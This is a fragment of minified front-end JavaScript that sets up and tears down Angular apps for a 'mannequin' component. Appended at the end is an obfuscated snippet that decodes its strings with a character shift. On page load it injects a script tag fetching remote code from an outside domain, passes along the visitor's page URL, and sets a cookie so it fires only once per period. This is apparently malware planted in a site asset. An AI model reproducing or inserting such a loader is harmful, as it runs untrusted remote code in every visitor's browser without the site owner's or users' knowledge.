i=+t.getAttribute("data-delay-instantiation-scalar")||1,r=e*i;this.watchers_.push(Et.elementInViewWatcherFirstChangeOnly(t,{threshold:0,rootMargin:r+"px"},((t,e,i)=>{e.isIntersecting&&(this.apps.push(this.createAngularApp(t)),this.rootElements.push(t),i())})))}else this.apps.push(this.createAngularApp(t)),this.rootElements.push(t)})),window.dispatchEvent(new Event("mannequinInternalReady"))}destroyAngularApps(){this.apps.forEach((t=>{t.get("$rootScope").$destroy()})),this.apps=[],this.rootElements.forEach((t=>{t.removeAttribute("mqn2-app")})),this.rootElements=[],this.watchers_.forEach((t=>{t.done()}))}};new GI})();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));